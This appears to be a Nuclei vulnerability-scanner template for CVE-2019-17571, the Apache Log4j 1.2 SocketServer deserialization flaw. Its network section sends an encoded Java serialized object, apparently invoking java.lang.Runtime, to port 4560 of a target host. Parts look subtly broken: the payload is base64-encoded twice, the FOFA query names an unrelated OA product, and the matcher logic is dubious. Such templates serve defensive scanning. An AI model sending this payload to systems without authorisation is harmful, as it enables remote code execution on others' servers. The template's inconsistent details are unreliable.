id: CVE-2019-17571

info:
  name: Apache Log4j 1.2 Deserialization RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.
  reference:
    - http://lists.opensuse.org/opensuse-security-announce/2020-01/msg00022.html
    - https://lists.apache.org/thread.html/277b4b5c2b0e06a825ccec565fa65bd671f35a4d58e3e2ec5d0618e1%40%3Cdev.tika.apache.org%3E
    - https://lists.apache.org/thread.html/44491fb9cc19acc901f7cff34acb7376619f15638439416e3e14761c%40%3Cdev.tika.apache.org%3E
    - https://lists.apache.org/thread.html/479471e6debd608c837b9815b76eab24676657d4444fcfd5ef96d6e6%40%3Cdev.tika.apache.org%3E
    - https://lists.apache.org/thread.html/564f03b4e9511fcba29c68fc0299372dadbdb002718fa8edcc4325e4%40%3Cjira.kafka.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-17571
    cwe-id: CWE-502
    epss-score: 0.80583
    epss-percentile: 0.98438
    cpe: cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: log4j
    fofa-query: app="致远互联-oa"
  impact: |
    Successful exploitation could lead to remote code execution on the affected server.
  remediation: |
    Upgrade to a non-vulnerable version of Apache Log4j 1.2 or apply the necessary patches.
network:
  - inputs:
      - data: "{{base64('rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQAAAAAAAAABAgAAeHIAEWphdmEudXRpbC5RdWV1ZQAAAAAAAAB4cHcEAAAAAHhxAH4ABXNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAABAgAAeHIADmphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhw')}}"
    host:
      - "{{Hostname}}"
    port: 4560
    read-size: 2048
    matchers:
      - type: word
        words:
          - "java.lang.Runtime"
        part: data